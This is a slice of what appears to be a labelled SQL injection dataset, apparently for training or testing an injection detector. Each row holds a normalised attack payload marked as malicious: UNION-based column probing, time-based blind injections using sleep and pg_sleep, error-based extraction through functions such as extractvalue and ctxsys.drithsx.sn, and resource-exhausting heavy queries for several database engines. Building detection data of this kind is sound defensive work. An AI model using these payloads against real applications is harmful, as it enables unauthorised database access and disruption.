row_index,payload_norm,label,sqli_type_hint
3810,"1%"" ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ""%"" = """,1,
3811,"1%"" ) ) union all select null,null,null,null,null,null,null--",1,
3812,"-4028 ) where 3244 = 3244 union all select 3244,3244,3244,3244,3244,3244,3244,3244--",1,
3813,"1'+ ( select lhtn where 8484 = 8484 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) +'",1,
3814,"1' ) ) as usrk where 6324 = 6324 union all select null,null,null,null,null,null,null,null,null,null--",1,
3815,"-7715' ) union all select 4830,4830,4830,4830,4830,4830,4830,4830--",1,
3816,"1"" ) ) rlike sleep ( 5 ) and ( ( ""fzlr"" = ""fzlr",1,
3817,"-9572%"" ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""%"" = """,1,
3818,select sleep ( 5 ) and ( ( ( 'rzjf' = 'rzjf,1,
3819,"1%"" ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ""%"" = """,1,
3820,"1"" ) union all select null,null,null,null,null--",1,
3821,"1' and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and 'moyb' = 'moyb",1,
3822,select pg_sleep ( 5 ) and ( ( ( 'mgbm' like 'mgbm,1,
3823,"1' ) ) union all select null,null,null,null,null,null--",1,
3824,1' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ( 'iuki' = 'iuki,1,
3825,"1%"" ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( ""%"" = """,1,
3826,"1%"" ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
3827,"1' ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( 'eflk' = 'eflk",1,
3828,"1"" ) ) and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",1,
3829,1 ) ) as bjxd where 4299 = 4299,1,
3830,1' ) where 9817 = 9817,1,
3831,"1%' ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( '%' = '",1,
3832,"1%"" ) ) ) or sleep ( 5 ) and ( ( ( ""%"" = """,1,
3833,1 where 8180 = 8180 or sleep ( 5 ) #,1,
3834,"-8312%"" ) ) union all select 4972--",1,
3835,1'|| ( select 'pmpd' where 9803 = 9803,1,
3836,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 'xori' like 'xori",1,
3837,-5432' ) as dndq where 9633 = 9633 order by 1#,1,
3838,"select count ( * ) from generate_series ( 1,5000000 ) and ( ( ( 'ldqq' = 'ldqq",1,
3839,1 where 8095 = 8095,1,
